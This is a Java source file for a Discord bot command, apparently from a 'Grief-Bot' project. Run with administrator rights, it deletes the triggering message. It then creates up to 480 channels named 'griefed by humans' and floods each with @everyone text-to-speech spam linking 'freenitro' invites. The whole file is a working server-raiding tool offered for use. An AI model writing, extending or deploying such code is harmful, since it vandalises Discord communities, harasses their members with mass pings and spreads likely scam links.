package com.visions.dev.Commands;

import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import lombok.SneakyThrows;
import net.dv8tion.jda.api.Permission;

import java.awt.*;
import java.net.Inet4Address;
import java.util.concurrent.TimeUnit;

public class GriefCommands extends Command {

    public GriefCommands() {
        this.name = "start";
        this.botPermissions = new Permission[]{Permission.ADMINISTRATOR};
        this.guildOnly = false;
        this.ownerCommand = true;
    }

    @SneakyThrows
    protected void execute(CommandEvent event) {

        Boolean channels = true;

        event.getMessage().delete().queue();


        for (int i = 0; i < 480; i++) {
            if (channels) {
                try {
                    event.getGuild().createTextChannel("griefed by humans").setTopic("https://github.com/Nopock/Grief-Bot").setNSFW(false).queue((m) ->
                            m.sendMessage(" LLL GET GRIEFED!!! @everyone https://discord.gg/freenitro https://tenor.com/view/puppy-eyes-sorry-funny-animals-puppy-dog-eyes-gif-14502312 https://discord.gg/freenitro ").tts(true).queue((v) ->
                                    v.getChannel().sendMessage("LLL GET GRIEFED!!! @everyone https://discord.gg/mmh https://tenor.com/view/puppy-eyes-sorry-funny-animals-puppy-dog-eyes-gif-14502312 https://discord.gg/freenitro ").tts(true).queue((b) ->
                                            b.getChannel().sendMessage("LLL GET GRIEFED!!! @everyone https://discord.gg/mmh https://tenor.com/view/puppy-eyes-sorry-funny-animals-puppy-dog-eyes-gif-14502312 https://discord.gg/freenitro ").tts(true).queue())));
                } catch (Exception e) {
                    System.out.println("Failed to create a channel.");
                    channels = false;
                }

            }
        }

    }
}
